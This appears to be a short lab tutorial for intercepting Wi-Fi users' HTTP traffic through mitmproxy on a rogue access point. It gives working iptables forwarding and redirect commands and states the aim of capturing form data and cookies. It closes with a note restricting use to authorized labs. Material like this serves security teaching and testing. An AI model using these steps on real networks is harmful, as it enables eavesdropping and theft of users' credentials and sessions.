# 🕷️ MITMProxy + Wi-Fi Interception Demo

Intercept HTTP/HTTPS traffic in real-time using `mitmproxy` on a rogue AP.

---

## ⚙️ Steps

1. Set up rogue AP as in `rogue-ap-attack.md`.

2. Configure `iptables` for forwarding:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

3. Start mitmproxy:

```bash
mitmproxy -p 8080 -v
```

4. Redirect traffic to port 8080:

```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## 🎯 Goal

Capture GET/POST data, cookies, and weakly encrypted traffic.

## ⚠️ Legal Note

Use only in test labs or authorized environments.

